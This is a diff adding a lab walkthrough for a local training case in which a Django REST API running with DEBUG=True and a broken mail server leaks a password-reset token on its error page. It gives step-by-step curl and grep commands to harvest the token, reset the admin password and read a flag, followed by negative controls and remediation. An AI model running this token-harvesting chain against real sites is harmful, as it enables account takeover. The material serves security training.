@@ -1,0 +1,93 @@
+C07 - DJANGO DEBUG + BROKEN SMTP = RESET TOKEN = ADMIN
+======================================================
+Lab      : c07-django-debug
+Case     : C7 (writeup para 56-67)
+Ports    : HTTP 18140, HTTPS 18503
+Start    : make up LAB=c07-django-debug
+Verify   : make verify LAB=c07-django-debug      (22 assertions)
+
+OBJECTIVE
+  Trigger an error in the password-reset flow, read the technical 500 page, and
+  take admin. This is the exploit case - the writeup's whole chain lands here.
+
+STEP 1 - the API is DRF and lists its surface
+  curl -sk -H 'Host: chat-api.corp.lab' https://127.0.0.1:18503/api/ | jq .
+  expected: users, auth/password_reset, auth/login, chats, chat-status
+
+STEP 2 - trigger the 500 (broken SMTP behind DEBUG=True)
+  curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d '{"email":"admin@corp.lab"}' -o /tmp/500.html -w '%{http_code} %{size_download}\n' \
+    https://127.0.0.1:18503/api/auth/password_reset
+  expected: 500 127374
+  (the writeup's page was ~135 727 bytes; same shape, different stack depth)
+
+STEP 3 - what is in the page
+  grep -c 'Traceback' /tmp/500.html
+  expected: 5
+  grep -o 'ConnectionRefusedError' /tmp/500.html | head -1
+  expected: ConnectionRefusedError
+  grep -c 'Reset link:' /tmp/500.html
+  expected: >= 1   (the drafted mail body is a frame local, printed in full)
+
+STEP 4 - harvest the token
+  grep -oE 'token=[0-9a-f]{32}' /tmp/500.html | head -1
+  expected: token=01c072d9398c547ec5eb138217bfee78   (value changes per request)
+
+  TOKEN=$(grep -oE 'token=[0-9a-f]{32}' /tmp/500.html | head -1 | cut -d= -f2)
+
+STEP 5 - redeem it
+  curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass-Aa1!\"}" \
+    https://127.0.0.1:18503/api/auth/password_reset/confirm
+  expected: {"detail":"password updated"}
+
+  Replay the same token:
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chat-api.corp.lab' \
+    -H 'Content-Type: application/json' \
+    -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass-Aa1!\"}" \
+    https://127.0.0.1:18503/api/auth/password_reset/confirm
+  expected: 400   (single use)
+
+STEP 6 - log in as admin and read the data
+  JWT=$(curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d '{"email":"admin@corp.lab","password":"NewPass-Aa1!"}' \
+    https://127.0.0.1:18503/api/auth/login | jq -r .token)
+  curl -sk -H 'Host: chat-api.corp.lab' -H "Authorization: Bearer $JWT" \
+    https://127.0.0.1:18503/api/chats | jq -r '.results[].body' | grep FLAG
+  expected: Admin console verification token: FLAG{django_debug_leaked_the_reset_token}
+
+  /api/users/ as admin:
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chat-api.corp.lab' \
+    -H "Authorization: Bearer $JWT" https://127.0.0.1:18503/api/users/
+  expected: 200
+
+STEP 7 - negative controls (why "I logged in" is not a pass)
+  Anonymous user list:
+  curl -sk -o /dev/null -w '%{http_code}\n' -H 'Host: chat-api.corp.lab' \
+    https://127.0.0.1:18503/api/users/
+  expected: 401 or 403
+
+  Agent login cannot see the flag:
+  AG=$(curl -sk -H 'Host: chat-api.corp.lab' -H 'Content-Type: application/json' \
+    -d '{"email":"alex@corp.lab","password":"agent-pass-2026"}' \
+    https://127.0.0.1:18503/api/auth/login | jq -r .token)
+  curl -sk -H 'Host: chat-api.corp.lab' -H "Authorization: Bearer $AG" \
+    https://127.0.0.1:18503/api/chats | grep -c 'FLAG{'
+  expected: 0
+
+  A 404 does not leak (DEBUG only renders unhandled 500s):
+  curl -sk -H 'Host: chat-api.corp.lab' https://127.0.0.1:18503/api/nope | grep -c Traceback
+  expected: 0
+
+WHY IT WORKS (the writeup's own root cause)
+  DEBUG=True renders the traceback AND the local variables of every frame. The view
+  builds the reset mail as a local string before handing it to EmailMessage; SMTP
+  refuses the connection, so the exception is raised AFTER the token was generated -
+  and the technical page prints that string. DEBUG=False returns a bare 500.
+
+REMEDIATION (as in the writeup)
+  DEBUG=False in production; treat a failing mail path as an error that never
+  surfaces the message; monitor for 500s on the reset endpoint.
+
+TEARDOWN
+  make down LAB=c07-django-debug     (use reset to drop the seeded volume: make reset)
